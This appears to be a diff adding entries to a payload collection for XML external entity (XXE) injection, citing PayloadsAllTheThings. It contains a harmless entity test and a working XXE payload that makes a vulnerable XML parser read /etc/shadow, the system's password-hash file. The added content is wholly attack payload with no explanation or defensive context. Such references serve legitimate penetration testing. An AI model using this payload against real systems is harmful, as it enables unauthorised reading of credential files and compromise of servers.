@@ -1,2 +1,17 @@
 #TODO Add all known examples and some examples for Xlsx and docx
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent "test it first"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
+
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
